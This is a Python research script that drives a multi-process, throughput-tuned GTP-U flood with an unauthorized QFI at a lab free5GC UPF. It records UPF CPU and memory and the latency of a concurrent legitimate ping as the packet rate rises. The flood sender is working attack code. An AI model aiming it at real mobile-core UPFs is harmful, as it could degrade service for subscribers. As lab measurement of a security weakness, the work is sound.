"""Measure a live free5GC UPF's cost while it forwards an unauthorized-QFI
uplink flood, at increasing packet rates.

Because the UPF forwards unauthorized-QFI G-PDUs (it does not police the uplink
QFI — see inject_qfi_attack.py), this measures the *forwarding* cost of that
unauthorized flow: UPF CPU/mem and the impact on a concurrent legitimate flow's
latency, as a function of attack packets-per-second.

    ./upfvenv/bin/python3 measure_upf_cost.py                       # default sweep
    ./upfvenv/bin/python3 measure_upf_cost.py --pps 0,1000,10000,50000 --duration 12
"""

import argparse
import re
import socket
import subprocess
import threading
import time
from multiprocessing import Process, Value

from inject_qfi_attack import build_gtpu_bytes

RTT_RE = re.compile(r"= [\d.]+/([\d.]+)/([\d.]+)/([\d.]+) ms")
LOSS_RE = re.compile(r"([\d.]+)% packet loss")
CPU_RE = re.compile(r"([\d.]+)%")


# The always-on speedup is the connected socket + tight send() loop below: a
# connect()ed UDP socket caches the route and skips per-packet address
# resolution, which alone lifts a single core from ~44k pps (the old
# sendto()-per-packet ceiling — the injector's limit, not the UPF's) to
# ~200k pps. If the runtime also exposes socket.sendmmsg (many datagrams per
# syscall — note CPython's stdlib socket does NOT), it's used as a further
# amortization; otherwise the send() path runs. Scale past one core with
# --workers.
_BATCH = 1024


def _blast(pkt, upf_ip, pps, duration, sent_counter):
    """One sender worker: pace to ~pps for `duration`s, adding its count to the
    shared `sent_counter`. Connected socket (cached route, no per-packet address
    resolution); uses sendmmsg if available, else a plain send() loop."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
    except OSError:
        pass
    s.connect((upf_ip, 2152))
    use_mmsg = hasattr(s, "sendmmsg")
    msgs = [[pkt]] * _BATCH
    start = time.perf_counter()
    sent = 0
    while True:
        elapsed = time.perf_counter() - start
        if elapsed >= duration:
            break
        target = int(elapsed * pps)
        if sent < target:
            n = min(_BATCH, target - sent)
            try:
                if use_mmsg:
                    sent += s.sendmmsg(msgs[:n])
                else:
                    for _ in range(n):
                        s.send(pkt)
                    sent += n
            except OSError:
                time.sleep(0.0001)   # ENOBUFS/EAGAIN under burst: back off briefly
        else:
            time.sleep(0.00005)
    s.close()
    with sent_counter.get_lock():
        sent_counter.value += sent


def send_load(pkt, upf_ip, pps, duration, workers=1):
    """Send `pkt` toward the UPF N3 at ~pps for `duration`s across `workers`
    processes. Returns achieved pps (summed over workers)."""
    if pps <= 0:
        time.sleep(duration)
        return 0.0
    counter = Value("q", 0)
    per = max(1, pps // workers)
    procs = [Process(target=_blast, args=(pkt, upf_ip, per, duration, counter))
             for _ in range(workers)]
    start = time.perf_counter()
    for pr in procs:
        pr.start()
    for pr in procs:
        pr.join()
    return counter.value / (time.perf_counter() - start)


def sample_upf(stop, cpu_out, mem_out):
    while not stop.is_set():
        try:
            r = subprocess.run(
                ["docker", "stats", "upf", "--no-stream", "--format", "{{.CPUPerc}}|{{.MemUsage}}"],
                capture_output=True, text=True, timeout=10)
            line = r.stdout.strip()
            if "|" in line:
                cpu, mem = line.split("|", 1)
                m = CPU_RE.search(cpu)
                if m:
                    cpu_out.append(float(m.group(1)))
                mem_out.append(mem.split("/")[0].strip())
        except Exception:
            pass


def legit_probe(duration, out):
    n = max(3, int(duration * 10))
    try:
        r = subprocess.run(
            ["docker", "exec", "ueransim", "ping", "-I", "uesimtun0", "-c", str(n),
             "-i", "0.1", "-W", "1", "8.8.8.8"],
            capture_output=True, text=True, timeout=duration + 20)
        out.append(r.stdout)
    except Exception as e:
        out.append(f"(probe failed: {e})")


def run_point(pkt, upf_ip, pps, duration, workers=1):
    stop = threading.Event()
    cpu, mem, probe = [], [], []
    t_stat = threading.Thread(target=sample_upf, args=(stop, cpu, mem))
    t_ping = threading.Thread(target=legit_probe, args=(duration, probe))
    t_stat.start()
    t_ping.start()
    achieved = send_load(pkt, upf_ip, pps, duration, workers=workers)
    t_ping.join()
    stop.set()
    t_stat.join()

    rtt_avg = rtt_max = loss = float("nan")
    if probe:
        mr = RTT_RE.search(probe[0])
        if mr:
            rtt_avg, rtt_max = float(mr.group(1)), float(mr.group(2))
        ml = LOSS_RE.search(probe[0])
        if ml:
            loss = float(ml.group(1))
    cpu_avg = sum(cpu) / len(cpu) if cpu else float("nan")
    cpu_max = max(cpu) if cpu else float("nan")
    return {
        "pps_target": pps, "pps_achieved": achieved,
        "cpu_avg": cpu_avg, "cpu_max": cpu_max, "mem": mem[-1] if mem else "?",
        "rtt_avg": rtt_avg, "rtt_max": rtt_max, "loss": loss,
    }


def main():
    p = argparse.ArgumentParser(description="Measure UPF forwarding cost of an unauthorized-QFI flood.")
    p.add_argument("--teid", type=lambda x: int(x, 0), default=0x2)
    p.add_argument("--qfi", type=int, default=7, help="Unauthorized QFI to flood (default: 7)")
    p.add_argument("--upf-ip", default="10.100.200.2")
    p.add_argument("--ue-ip", default="10.60.0.1")
    p.add_argument("--dst", default="192.0.2.1", help="Inner dst; default TEST-NET blackhole (no internet flood, no replies)")
    p.add_argument("--pps", default="0,1000,10000,50000,150000", help="Comma-separated target pps points (0 = baseline)")
    p.add_argument("--duration", type=float, default=12.0, help="Seconds per point")
    p.add_argument("--workers", type=int, default=1, help="Parallel sender processes (each targets pps/workers). Raise to push past a single core's send ceiling.")
    args = p.parse_args()

    pkt = build_gtpu_bytes(args.ue_ip, args.dst, args.teid, args.qfi, 0x4242, 1)
    points = [int(x) for x in args.pps.split(",")]

    print(f"UPF forwarding-cost sweep  |  QFI={args.qfi} (unauthorized)  TEID={hex(args.teid)}  "
          f"inner dst={args.dst}  {args.duration}s/point  workers={args.workers}")
    print(f"packet size on wire (GTP-U payload) = {len(pkt)} bytes\n")
    hdr = f"{'target pps':>11} {'achieved pps':>13} {'UPF CPU avg':>12} {'CPU max':>9} {'UPF mem':>10} {'legit RTT avg':>14} {'RTT max':>9} {'loss%':>7}"
    print(hdr)
    print("-" * len(hdr))
    for pps in points:
        r = run_point(pkt, args.upf_ip, pps, args.duration, workers=args.workers)
        print(f"{r['pps_target']:>11} {r['pps_achieved']:>13.0f} {r['cpu_avg']:>11.1f}% {r['cpu_max']:>8.1f}% "
              f"{r['mem']:>10} {r['rtt_avg']:>12.2f}ms {r['rtt_max']:>7.2f}ms {r['loss']:>7.1f}")


if __name__ == "__main__":
    main()
